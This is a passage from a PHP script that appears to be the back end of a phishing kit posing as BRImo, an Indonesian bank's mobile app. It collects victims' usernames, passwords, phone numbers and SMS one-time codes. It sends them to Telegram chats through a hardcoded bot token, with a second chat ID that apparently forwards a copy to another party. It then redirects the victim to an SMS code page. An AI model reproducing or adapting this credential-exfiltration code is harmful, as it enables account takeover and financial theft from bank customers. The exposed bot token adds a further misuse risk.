				<tr>
					<td style="border-right: none;">Password </td>
					<td style="text-align: center;">$password</td>
				</tr>
				
				<tr>
					<th style="text-align: center;" colspan="3">&copy; Brynz.ID</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;



include 'mailman.php';
$sender ='From: BRI <admin@Brynz.ID>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
/*$kirim = mail($mail, $subjek, $pesan, $headers);*/


ini_set( 'display_errors', 1 );   
error_reporting( E_ALL );    
$from = $sender;    
$to = $mail;    
$subject = $subjek;    
$message = $pesan;   
/*$headers = "From:" . $from;  */  

$pesantelegram = <<<EOD
BRImo Notif 
------------------------
Username : $email 
Password : $password
No Handphone : $telepon
SMS Kode : $sms
EOD;

$telegram_id = $id_telegram;
$message_text = $pesantelegram;
$secret_token = '5751555863:AAGdbEXztQKMOYOJuxCRDECvLYJiyOwkwSQ';

function sendMessage($telegram_id, $message_text, $secret_token) {
    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message_text);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    if ($err) {
       echo 'Pesan gagal terkirim, error :' . $err;
    }else{
        echo 'Pesan terkirim';
    }
}

$telegram_id2 = '5597739679';
function sendMessage2($telegram_id2, $message_text, $secret_token) {
    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id2;
    $url = $url . "&text=" . urlencode($message_text);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    if ($err) {
       echo 'Pesan gagal terkirim, error :' . $err;
    }else{
        echo 'Pesan terkirim';
    }
}


if($submit){
    /*mail($to,$subject,$pesan, $headers); 
    sendMessage($telegram_id, $message_text, $secret_token);
    sendMessage2($telegram_id2, $message_text, $secret_token);*/
    header('Location: '.$base_url."sms.php?nomorhp=".$telepon."&username=".$email."&password=".$password);
    
   
}
ob_end_flush()
?>
